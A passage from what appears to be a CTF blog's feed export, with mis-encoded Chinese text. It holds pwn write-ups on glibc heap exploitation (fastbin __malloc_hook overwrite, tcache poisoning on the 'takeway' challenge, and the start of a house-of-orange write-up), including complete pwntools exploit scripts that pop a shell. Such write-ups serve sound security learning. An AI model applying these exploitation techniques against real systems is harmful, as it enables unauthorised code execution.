str(4))</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">Â  Â  io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base Â  ---&gt; Â  &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="â…£-ä¸€äº›ç–‘é—®"><a href="#â…£-ä¸€äº›ç–‘é—®" class="headerlink" title="â…£. ä¸€äº›ç–‘é—®"></a>â…£. ä¸€äº›ç–‘é—®</h3><ol>
<li>__malloc_hookä¸æ˜¯åœ¨dataæ®µä¸­å—ï¼Ÿè¿™é¢˜å¼€äº†FULL RELROä¸ºä»€ä¹ˆå¯ä»¥æ”¹å•ŠğŸ¤”</li>
<li>ç¬¬ä¹æ­¥ä¸­heapä¸­chunk2çš„Addrä¸ºä»€ä¹ˆè¿˜æ˜¯40è€Œä¸æ˜¯80å•Šï¼Ÿ</li>
<li>ç¬¬åæ­¥ä¸ºä»€ä¹ˆchunk4ä¼šè·Ÿtopchunkåˆå¹¶ï¼Ÿæ˜¯å“ªä¸ªbinçš„æœºåˆ¶ï¼Ÿ<ol>
<li>unsortedbinï¼Œåå‘åˆå¹¶</li>
</ol>
</li>
<li><strong><em>ä¸ºä»€ä¹ˆéè¦åœ¨aedå¤„ç”³è¯·å †å—ï¼Ÿ</em></strong><ol>
<li>fastbinæŒ‡é’ˆæŒ‡å‘0xaedï¼Œè¯´æ˜0xaed-8æ˜¯sizeï¼Œ0xaed-0x10æ˜¯prev_sizeï¼Œæ­£å¥½ä¼ªè£…chunk</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>WriteUp, Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ç¬¬ä¸ƒå±Šè“å¸½æ¯åˆèµ›Pwn-takeway-wp</title>
    <url>/2023/08/26/blog5/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
å­¦è‰ºä¸ç²¾...å¯¹äº"è¯»/å†™å‡½æ•°å¯¹æŒ‡é’ˆçš„åˆ©ç”¨"æ²¡é‚£ä¹ˆæ•æ„Ÿï¼ˆ
</blockquote>

<span id="more"></span>
<h1 id="0xff-è¯´åœ¨å‰é¢"><a href="#0xff-è¯´åœ¨å‰é¢" class="headerlink" title="0xff è¯´åœ¨å‰é¢"></a>0xff è¯´åœ¨å‰é¢</h1><p>ä¸‹æ–‡EXPä¸­ï¼Œleakå †åœ°å€çš„éƒ¨åˆ†éœ€è¦â€ä¼ªçˆ†ç ´â€ï¼Œå¦‚æœæŠ¥é”™çš„è¯å¤šè¿è¡Œä¸¤ä¸‰æ¬¡è„šæœ¬ï¼Œç›´åˆ°heap_addrä¸ºå››å­—èŠ‚æ—¶å³å¯æˆåŠŸè¿è¡Œ<br><a href="https://cowtransfer.com/s/bf2ac55a69364d">é¢˜ç›®åœ°å€</a>ä¸‹è½½å£ä»¤: 7c9pe6</p>
<h1 id="0x00-Exploitations"><a href="#0x00-Exploitations" class="headerlink" title="0x00 Exploitations"></a>0x00 Exploitations</h1><ol>
<li>tcachebin libc2.31 <ol>
<li>tcachebin poisoning</li>
<li>ç‰ˆæœ¬åˆ¤æ–­<ol>
<li>tcacheæœ‰keyæ··æ·†ï¼Œåˆ™æ˜¯2.31ä»¥ä¸Š(ä¸åŒ…å«2.31)</li>
<li>tcacheæœ‰doublefreeæ£€æµ‹ï¼Œåˆ™æ˜¯2.28ä»¥ä¸Š</li>
<li>æœ‰tcacheï¼Œåˆ™æ˜¯2.26ä»¥ä¸Š</li>
</ol>
</li>
</ol>
</li>
<li>UAF</li>
<li>åˆ©ç”¨é¢˜ç›®æä¾›çš„å †è¡¨+puts/readè¿›è¡Œä»»æ„åœ°å€è¯»å†™</li>
</ol>
<h1 id="0x01-åæ±‡ç¼–ä¿®æ”¹"><a href="#0x01-åæ±‡ç¼–ä¿®æ”¹" class="headerlink" title="0x01  åæ±‡ç¼–ä¿®æ”¹"></a>0x01  åæ±‡ç¼–ä¿®æ”¹</h1><pre><code>    é¦–å…ˆè¿›è¡Œä¸€ä¸ªåæ±‡ç¼–çš„è¯»   
</code></pre><blockquote>
<p>trick: IDAä¸­å¯¹å˜é‡æŒ‰Yé”®å¯ä»¥æ”¹å˜å˜é‡ç±»å‹</p>
</blockquote>
<p><img src="/pic/Pasted image 20230826230935.png" alt=""><br>alloc: strcspnæ˜¯ä»å­—ç¬¦ä¸²ä¸­è¿”å›ä¸å«â€œæ‰€æŸ¥æ‰¾å­—ç¬¦â€çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦<br><img src="/pic/Pasted image 20230826231015.png" alt=""><br>delete: æŒ‡é’ˆæœªç½®é›¶ï¼Œä¸€çœ¼UAF<br><img src="/pic/Pasted image 20230826231112.png" alt=""><br>modify<br><img src="/pic/Pasted image 20230826231127.png" alt=""></p>
<h1 id="0x02-åˆ†æä¸æ€è·¯æ„é€ "><a href="#0x02-åˆ†æä¸æ€è·¯æ„é€ " class="headerlink" title="0x02  åˆ†æä¸æ€è·¯æ„é€ "></a>0x02  åˆ†æä¸æ€è·¯æ„é€ </h1><blockquote>
<p>åˆ†æéƒ¨åˆ†  </p>
</blockquote>
<ol>
<li>åˆ†æalloc: åªç»™äº†äº”æ¬¡åˆ›å»ºå †çš„æœºä¼šï¼Œå †çš„å¤§å°éƒ½å›ºå®šä¸º0x28<ol>
<li>æ²¡åŠæ³•ç›´æ¥ç”¨unsortedbin leak libc</li>
<li>ä¸èƒ½é€šè¿‡å¡«æ»¡tcachebinæ¥ç»•è¿‡tcacheæœºåˆ¶</li>
<li>tcachebins poisoning<ol>
<li>èƒ½æ‹¿åˆ°å †åœ°å€: é€šè¿‡gdbæ‰¾åç§»æ¥åœ¨å †åŒºä¼ªé€ chunk</li>
<li>èƒ½æ‹¿åˆ°æ ˆåœ°å€: é€šè¿‡gdbæ‰¾åç§»æ¥åœ¨æ ˆåŒºä¼ªé€ chunk</li>
</ol>
</li>
</ol>
</li>
<li>åˆ†æmodify: æœ‰puts/read<ol>
<li>å¯èƒ½é€šè¿‡putsâ€ç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦æ‰åœæ­¢è¾“å‡ºâ€çš„åŸç†æ¥æ³„éœ²ä»€ä¹ˆä¸œè¥¿</li>
</ol>
</li>
<li>åˆ†ædelete<ol>
<li>UAF</li>
</ol>
</li>
<li>è¿œç¨‹æµ‹è¯•libcç‰ˆæœ¬<ol>
<li>doubleFreeæœ‰é™åˆ¶ï¼Œ2.28ä»¥ä¸Š</li>
<li>æ²¡æœ‰keyæ··æ·†bkï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°å †åœ°å€ï¼Œ2.31åŠä»¥ä¸‹</li>
</ol>
</li>
</ol>
<blockquote>
<p> æ€è·¯æ„é€ éƒ¨åˆ†</p>
</blockquote>
<p>æœ€å¼€å§‹æ²¡patchelfï¼Œåªèƒ½freeä¸¤ä¸ªchunkåˆ°tcachebiné‡Œï¼Œé€šè¿‡æ³„éœ²fdçš„æ–¹å¼æ¥æ³„éœ²å †åœ°å€ï¼Œç„¶åæˆ‘æƒ³tcachebin poisoningæŠŠå †ä¸­å¤§å°ä¸º0x1011çš„ç¼“å†²åŒºä¸‹é¢çš„é‚£ä¸€éƒ¨åˆ†ç»™ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆunsortedbinç„¶åè·å–libcï¼Œå†poisonåˆ°gotè¡¨ä¿®æ”¹freeï¼Œæœ€åææƒã€‚ä½†è¿™æ ·æ¶ˆè€—çš„chunkæ•°ç›®è¿œå¤§äº5ä¸ªã€‚<br>åæ¥patchä»¥åå‘ç°bké‡Œå°±æœ‰å †åœ°å€ï¼Œç„¶ååˆæƒ³åˆ°ä¸´è¿‘top chunkçš„unsorted binä¼šè¢«åˆå¹¶ã€‚äºæ˜¯æŠŠç›®æ ‡å¯¹å‡†äº†heapListã€‚æƒ³é€šè¿‡ä¿®æ”¹heapListçš„sizeæ®µä½0x1041æ¥ä¼ªé€ ä¸€ä¸ªunsortedbinï¼Œç„¶åleak libcã€‚ç»“æœä¹Ÿæ˜¯éœ€è¦å¤§é‡chunkï¼Œè€Œä¸”è¿˜ç”³è¯·å¤±è´¥äº†ï¼Œç°åœ¨æ²¡ææ˜ç™½ä¸ºå•¥å¤±è´¥äº†ä¸è¯´ï¼Œè¿æŠ¥é”™éƒ½å¿˜äº†ï¼Œæ— ä»ä¸‹æ‰‹äº†ï¼ˆ<br>æ‰“å®Œæ¯”èµ›ä»¥åè·ŸN1nEmAnå¸ˆå‚…æ²Ÿæµäº†ä¸€ä¸‹ï¼Œå‘ç°é¢˜ç›®å¦‚æœèƒ½åœ¨heapListä¼ªé€ chunkçš„è¯ï¼Œå°±å¯ä»¥é€šè¿‡modifyå‡½æ•°é‡Œçš„putså’Œreadä»»æ„åœ°å€è¯»å†™äº†ã€‚æˆ‘ç›´æ¥éœ‡æ’¼HeyGapä¸€ç™¾å¹´ã€‚</p>
<p>ç»¼ä¸Šï¼Œæ€è·¯ä¸ºï¼š  </p>
<ol>
<li>åˆ©ç”¨tcachebinçš„bkæ³„éœ²å †åœ°å€</li>
<li>åœ¨heapListä¼ªé€ chunkï¼Œä¿®æ”¹chunk0_pträ¸ºâ€puts_got-8â€</li>
<li>putsä¼šæ‰“å°puts_gotæŒ‡å‘çš„åœ°å€ï¼Œå³puts_libc_addrï¼Œç„¶åè®¡ç®—systemåœ°å€</li>
<li>é€šè¿‡gdbå‘ç°â€puts_got-8â€æ­£å¥½æ˜¯â€free_gotâ€</li>
<li>è€Œreadå‡½æ•°æ­£å¥½æ˜¯ä¿®æ”¹â€puts_got-8â€æŒ‡å‘çš„åœ°å€ï¼Œå³free_libc_addrï¼Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸ºsys_libc_addr</li>
<li>ç”±äºchunk0_ptr, chunk1_ptrå‡è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾â€ptræ²¡æœ‰è¢«ä¿®æ”¹â€&amp;â€chunkæ²¡æœ‰è¢«freeè¿‡â€çš„chunk2å­˜ä¸€ä¸‹/bin/sh</li>
<li>free chunk2 â€”&gt; getshellï¼<h1 id="0x03-åˆ†æ­¥è§£é¢˜"><a href="#0x03-åˆ†æ­¥è§£é¢˜" class="headerlink" title="0x03  åˆ†æ­¥è§£é¢˜"></a>0x03  åˆ†æ­¥è§£é¢˜</h1></li>
<li><p>patchelfï¼Œæ ¹æ®è¿œç¨‹è°ƒè¯•é€‰æ‹©äº†libc2.31</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ©ç”¨tcachebinçš„bkæ³„éœ²å †åœ°å€<br>å¯ä»¥çœ‹åˆ°bkæ˜¯æŒ‡å‘tcachebin_entries[3]çš„<br><img src="/pic/Pasted image 20230827001916.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)     # è¿™é‡Œç”³è¯·äº†chunk1å…¶å®å¯¹è¿™ä¸€æ­¥æ²¡å•¥ç”¨ï¼Œä¸‹ä¸€æ­¥ç”³è¯·ä¹Ÿè¡Œ</span><br><span class="line">delete(0)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;)) # æ³¨ï¼šè¿™é‡Œæˆ‘æ²¡æƒ³åˆ°æ›´å¥½çš„æ–¹æ³•ï¼Œheap_addræœ‰å¯èƒ½æ˜¯ä¸‰å­—èŠ‚</span><br><span class="line">															  ä¹Ÿæœ‰å¯èƒ½æ˜¯å››å­—èŠ‚ï¼Œæ‰€ä»¥åç»­å¦‚æœæŠ¥é”™å¤šè¯•å‡ æ¬¡å°±è¡Œã€‚</span><br><span class="line">print(&#x27;heap_addr Â  ---&gt; Â  &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br></pre></td></tr></table></figure></li>
<li>é€šè¿‡tcache poisoningåœ¨heapListæ®µä¼ªé€ chunk2ï¼Œ<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(1)                        # æŠŠä¸Šä¸€æ­¥ç”³è¯·çš„chunk1æ”¾è¿›tcachebin</span><br><span class="line"># gdb.attach(io)                 # é€šè¿‡binså‘½ä»¤å¯ä»¥çœ‹åˆ°ç°åœ¨æ˜¯tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span><br><span class="line">payload = p64(heap_addr + 0x290) # æ”¹ä¸ºtcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span><br><span class="line">fill(1,payload)                  </span><br><span class="line">alloc(2,payload1,payload2)       # æŠŠchunk1ç”³è¯·å‡ºæ¥ï¼Œbinså˜ä¸ºtcachebin_entries[3] -&gt; (heap_addr + 0x290)</span><br></pre></td></tr></table></figure></li>
<li>ç”³è¯·chunk2ï¼ŒåŒæ—¶æŠŠputs_got-8å†™è¿›heapList[0]ï¼Œç„¶åé€šè¿‡modifyå‡½æ•°ä¸­çš„putsæ³„éœ²libcï¼ˆç¬”è¯¯: ä¸‹å›¾â€œåŠ ä¸Šä¸‹ä¸€ä¸ªchunkçš„prev_sizeæ„æˆäº†chunk2â€ä¸­çš„â€chunk2â€åº”ä¸ºchunk3ï¼‰<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr Â  ---&gt; Â  &#x27;,hex(puts_addr))</span><br></pre></td></tr></table></figure>
<img src="/pic/Pasted image 20230827003153.png" alt=""><br>è¯»è€…ä¹Ÿå¯ä»¥é€šè¿‡<code>x/20gx 0x404020</code>æ¥æŸ¥çœ‹Libcä¸­freeçš„ä¸‹ä¸€ä¸ªåœ°å€æ˜¯ä¸æ˜¯puts  </li>
<li>ä¿®æ”¹â€puts_got-8â€æŒ‡å‘çš„åœ°å€ï¼Œå³free_libc_addrï¼Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸ºsys_libc_addr<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr Â = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base Â  ---&gt; Â  &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr Â  Â ---&gt; Â  &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br></pre></td></tr></table></figure></li>
<li>æ‰¾â€ptræ²¡æœ‰è¢«ä¿®æ”¹â€&amp;â€chunkæ²¡æœ‰è¢«freeè¿‡â€çš„chunk2å­˜ä¸€ä¸‹/bin/shç„¶åfreeæ‰ä»–ï¼Œgetshellï¼<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="0x04-å®Œæ•´EXP"><a href="#0x04-å®Œæ•´EXP" class="headerlink" title="0x04  å®Œæ•´EXP"></a>0x04  å®Œæ•´EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;101.200.234.115&#x27;</span><br><span class="line">port = 42490</span><br><span class="line">file = &#x27;./takeway&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./takeway&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,name,remark):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index&#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name: &#x27;, name)</span><br><span class="line">  io.sendafter(&#x27;remark: &#x27;, remark)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def fill(index,name):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name is: &#x27;, name)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload1 = &#x27;\x00&#x27;</span><br><span class="line">payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)</span><br><span class="line">delete(0)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">delete(1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = p64(heap_addr + 0x290)</span><br><span class="line">fill(1,payload)</span><br><span class="line">alloc(2,payload1,payload2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05  æ€»ç»“"></a>0x05  æ€»ç»“</h1><p>è¿™é¢˜å¤ªé—æ†¾äº†â€¦æœ€åä¹Ÿæ²¡åšå‡ºæ¥ã€‚ä¸è¿‡åšä¸€çªä¸é€šçš„é¢˜æ”¶è·æ‰æœ€å¤§ã€‚<br>åšè¿™é“é¢˜ä¹‹å‰è¿˜ä»æ¥æ²¡æ¥è§¦è¿‡2.26ç‰ˆæœ¬ä»¥ä¸Šçš„å †é¢˜ï¼Œæ‰€ä»¥å¯¹tcachebinå®Œå…¨ä¸äº†è§£ã€‚<br>å¯¹tcachebinçš„ç¬¬ä¸€å°è±¡å¦‚ä¸‹:      </p>
<ol>
<li>æ¦‚è¿°  <ol>
<li>0x10~0x410ï¼ˆè²Œä¼¼æ˜¯ï¼‰çš„chunk</li>
<li>LIFO</li>
<li>å¤§å°åªæœ‰7ï¼Œfreeæ»¡ä»¥åå†freeå°±ä¼šæ”¾åˆ°å¯¹åº”çš„å…¶ä»–binä¸­</li>
<li>2.28åŠä»¥ä¸‹çš„libcä¸æ£€æµ‹double free</li>
</ol>
</li>
<li>ä¼ªé€ chunk<ol>
<li>å®‰å…¨æ€§æ¯”fastbinè¿˜å·®ï¼Œä¸æ£€éªŒfdæŒ‡å‘chunkçš„sizeç›´æ¥ç”³è¯·</li>
</ol>
</li>
<li>leakå †åœ°å€<ol>
<li>2.31åŠä»¥ä¸‹libcæ²¡æœ‰keyåŠ å¯†ï¼Œå¯ä»¥ç›´æ¥leakå‡ºå¯¹åº”å¤§å°çš„tcachebin_entry<br>ç›®å‰å°±æƒ³åˆ°è¿™äº›ï¼Œè¿™æ¬¡å¤šäºé˜Ÿå‹å¸¦é£ï¼Œè¿›åŠå†³èµ›äº†XD</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>WriteUp, Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2023SICTF-Pwn-baby_heap-wp</title>
    <url>/2023/09/22/blog6/</url>
    <content><![CDATA[<p><blockquote class="blockquote-center">
babyä¸€ç‚¹éƒ½ä¸baby...houseoforange+unsortedbinattack
</blockquote><br><span id="more"></span></p>
<h1 id="0x00-é€†å‘åˆ†æ"><a href="#0x00-é€†å‘åˆ†æ" class="headerlink" title="0x00  é€†å‘åˆ†æ"></a>0x00  é€†å‘åˆ†æ</h1><ol>
<li>mainå‡½æ•°å¾ˆç®€å•ï¼Œ1ç”³è¯·2ç¼–è¾‘3æ‰“å°ï¼Œä½†æ˜¯æ²¡æœ‰freeï¼Œgoogleâ€™no free pwnâ€™äº†è§£åˆ°æœ‰å¯èƒ½æ˜¯houseoforange</li>
<li>addå‡½æ•°ï¼Œä¸¤ä¸ªçº¦æŸï¼ˆ1. æœ€å¤šç”³è¯·32ä¸ªchunk 2. chunkæœ€å¤§ä¸º0x1000ï¼‰ï¼Œè·Ÿè¿›chunk_sizeå’Œchunk_ptråå‘ç°ä¸¤è€…åœ¨bssæ®µæŒ¨å¾—å¾ˆè¿‘ï¼Œæ‰€ä»¥è¿™é‡Œå…¶å®å¯ä»¥ä¼ªé€ fake_chunkï¼Œåç»­å¯ä»¥è€ƒè™‘ç”¨fastbin attackæˆ–è€…unsortedbin attackæ¥æ‰“ï¼ˆä½†è¿™é‡Œæ²¡æœ‰freeï¼Œå°±å¯¼è‡´fastbinå¾ˆéš¾åˆ©ç”¨ï¼‰<br><img src="/pic/Pasted image 20230922101040.png" alt=""></li>
<li>editå‡½æ•°<br><img src="/pic/Pasted image 20230922101820.png" alt=""></li>
<li>showå‡½æ•°ï¼Œåªæ‰“å°äº†8ä¸ªå­—èŠ‚å°±å¾ˆéš¾å—<br><img src="/pic/Pasted image 20230922101901.png" alt=""></li>
</ol>
<h1 id="0x01-æ€è·¯åˆ†æ"><a href="#0x01-æ€è·¯åˆ†æ" class="headerlink" title="0x01  æ€è·¯åˆ†æ"></a>0x01  æ€è·¯åˆ†æ</h1><ol>
<li>æˆ‘ä»¬è‚¯å®šæ˜¯è¦å®ç°â€œleak libcâ€å’Œâ€œAny Address Writeâ€<ol>
<li>leak libc<ol>
<li>æ€è·¯1ï¼šunsortedbin leak<ol>
<li>ç†è®ºä¸Šå¯è¡Œï¼Œä½†ç”±äºshowåªæ‰“å°å…«ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¿…é¡»è¦æŠŠunsortedbiné‡Œçš„chunkç”³è¯·å‡ºæ¥å†æ‰“å°ï¼Œè¿™æ ·å°±ä¼šæµªè´¹ä¸€ä¸ªchunkï¼Œåç»­åˆ©ç”¨æ¯”è¾ƒéº»çƒ¦</li>
</ol>
</li>
<li>æ€è·¯2ï¼šåœ¨bssæ®µä¼ªé€ fake_chunkå†™å…¥gotè¡¨ï¼Œç›´æ¥writeå‡ºæ¥</li>
</ol>
</li>
<li>Any Address Write<ol>
<li>æ€è·¯1ï¼šå¸¸è§„unsortedbin attack<ol>
<li>æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘çš„è¯„ä»·æ˜¯ä¸å¦‚unsortedbinç”³è¯·fake_chunk</li>
</ol>
</li>
<li>æ€è·¯2ï¼šunsortedbin ç”³è¯· fake_chunk<ol>
<li>å°†victim.bkè®¾ç½®ä¸ºfake_chunk_headï¼Œç”³è¯·ä¸¤æ¬¡å³å¯è·å¾—</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>å°†å†™å…¥çš„gotè¡¨æ”¹å†™ä¸ºogå³å¯ææƒ</li>
</ol>
<h1 id="0x02-å…·ä½“æ­¥éª¤"><a href="#0x02-å…·ä½“æ­¥éª¤" class="headerlink" title="0x02  å…·ä½“æ­¥éª¤"></a>0x02  å…·ä½“æ­¥éª¤</h1><ol>
